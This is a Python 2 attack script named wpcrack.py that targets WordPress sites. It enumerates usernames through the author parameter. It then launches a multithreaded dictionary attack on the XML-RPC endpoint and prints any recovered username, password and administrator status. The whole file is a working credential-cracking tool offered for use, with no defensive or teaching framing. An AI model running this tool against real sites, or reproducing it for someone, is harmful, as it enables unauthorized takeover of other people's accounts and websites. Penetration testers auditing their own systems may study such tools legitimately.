#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
 Name: wpcrack.py
 Date: 21/09/2014
 Version: v0.2

 Summary

  Wordpress user's dictionary attack through the XML-RPC service.

 Author:
  Vte. J. Garcia Mayen <jgarcia(at)seinhe.com>

 Copyright (c) 2014 seinhe.com

 This program is free software; you can redistribute it and/or modify it
 under the terms of the GNU General Public License as published by the
 Free Software Foundation; either version 2 of the License, or (at your
 option) any later version.  See http://www.gnu.org/copyleft/gpl.html for
 the full text of the license.
"""
import requests
import threading
from os import _exit
from lxml import etree
from bs4 import BeautifulSoup

LOCK = threading.Semaphore(value=1)

def send_post_request(url, data):
    """ Function that sends a post request and returns the response content """

    #proxies = {'http': 'http://localhost:8080', }
    headers = {'Content-Type':'application/x-www-form-urlencoded'}

    try:
        req = requests.post(url, data, timeout=5,
            headers=headers)
    except requests.exceptions.RequestException as retexception:
        LOCK.acquire()
        print "[Error] " + str(retexception)
        _exit(1)

    return (req.status_code, unicode(req.text).encode('utf-8'))


def send_get_request(url):
    """ Function documentation """

    #proxies = {'http': 'http://localhost:8080', }

    try:
        req = requests.get(url, timeout=5)
    except requests.exceptions.RequestException as retexception:
        LOCK.acquire()
        print "[Error] " + str(retexception)
        _exit(1)

    return (req.status_code, unicode(req.text).encode('utf-8'))


def build_xml_data(username, password):
    """ Function that generates the correct xml text to send """

    data  = "<?xml version='1.0' encoding='utf-8'?>"
    data += "<methodCall>"
    data += "  <methodName>wp.getUsersBlogs</methodName>"
    data += "  <params>"
    data += "    <param><value>%s</value></param>" % username
    data += "    <param><value>%s</value></param>" % password
    data += "  </params>"
    data += "</methodCall>"

    return data


def parse_pass_response(response):
    """ Function that analyzes the xml server response """

    tree = etree.fromstring(response)

    if tree.xpath(".//name[text()='isAdmin']"):
        return tree.find(".//boolean").text

    if "XML-RPC" in tree.find(".//string").text:
        print "[-] %s" % tree.find(".//string").text
        _exit(1)

    return None


def test_user_password(url, username, password, quiet):
    """ Function that launchs the actions to brute forcing the target """

    data = build_xml_data(username, password)
    (status,response) = send_post_request(url, data)

    result = parse_pass_response(response)
    if result:
        LOCK.acquire()
        print "\n[+] Username: %s" % username
        print "[+] Password: %s" % password
        if bool(result):
            print "[+] Profile : administrator"
        _exit(0)
    else:
        if not quiet:
            LOCK.acquire()
            print "[-] The password '%s' doesn't match" % password
            LOCK.release()


def do_brute_force(args):
    """ Function documentation """

    try:
        hnd = open(args.wordlist)
    except IOError as reterror:
        print str(reterror).encode('utf8')
        exit(1)

    for line in hnd.readlines():
        password = line.strip('\n')
        threading.Thread(
            target = test_user_password,
            args = (args.url, args.user, password, args.quiet)
        ).start()


def parse_user_response(status, response):
    """ Function documentation """

    soup = BeautifulSoup(response)
    if ((status >= 200) and (status < 400)):
        user = soup.body['class'][2][len('author-'):]
        return True, user
    else:
        return False,

def test_user_exist(url, httpmethod, uid, verbose):
    """ Function documentation """

    if httpmethod == "GET":
        url = url + "/?author=%d" % uid
        (status, response) = send_get_request(url)
    else:
        (status, response) = send_post_request(url, "author=%d" % uid)

    result = parse_user_response(status, response)
    if result[0]:
        LOCK.acquire()
        print "[+] User found (uid: %d): %s" % (uid, result[1])
        LOCK.release()
    else:
        if not verbose:
            LOCK.acquire()
            print "[-] User id %d not found" % uid
            LOCK.release()


def do_user_enumeration(args):
    """ Function documentation """

    for uid in range(1, args.num + 1):
        threading.Thread(
            target = test_user_exist,
            args = (args.url, args.method, uid, args.quiet)
        ).start()


def main(args):
    """ Main function """

    if 'num' in vars(args).keys():
        do_user_enumeration(args)
    else:
        args.url = args.url + "/xmlrpc.php"
        if send_get_request(args.url)[0] != 200:
            print "[Error] The xmlrpc.php script is not found"
            exit(1)
        do_brute_force(args)


if __name__ == "__main__":

    import argparse

    ARGVPARSER = argparse.ArgumentParser(
        description  = "Wordpress user's dictionary attack through "
                       "the XML-RPC service. If the user's password"
                       " is found the credentials will be show. "
                       "Additionally, if the guessed password belongs"
                       " to a user with the administrator role that"
                       " will be also show.",
        epilog = "Copyright (c) 2014 - neofito & SEINHE, http://www.seinhe.com",
        add_help =True,
        version = '%(prog)s v0.2'
    )

    GROUP = ARGVPARSER.add_argument_group('common arguments')

    GROUP.add_argument('-u', '--url',
        action='store', required=True,
        help='The url for the wordpress site')

    GROUP.add_argument('-q', '--quiet',
        action='store_true', dest='quiet', default=False,
        help='don\'t show you incorrect test results')

    SUBPARSER = ARGVPARSER.add_subparsers()

    ENUMERATE = SUBPARSER.add_parser('enumerate',
        help='enumerate the wordpress user\'s')

    ENUMERATE.add_argument('-n', '--num',
        dest='num', type=int, default=10,
        help='max value to the wordpress user id, 10 by default')

    ENUMERATE.add_argument('-m', '--http-verb',
        dest='method', choices=['GET', 'POST'], default='GET',
        help='http verb used to make the requests, GET by default')

    BRUTEFORCE = SUBPARSER.add_parser('bruteforce',
        help='bruteforce the wordpress user passwords\'')

    BRUTEFORCE.add_argument('-u', '--user',
        dest='user', default='admin',
        help='wordpress username, admin by default')

    BRUTEFORCE.add_argument('-w', '--wordlist',
        dest='wordlist', required=True,
        help="the dictionary file of passwords")

    ARGS = ARGVPARSER.parse_args()

    main(ARGS)

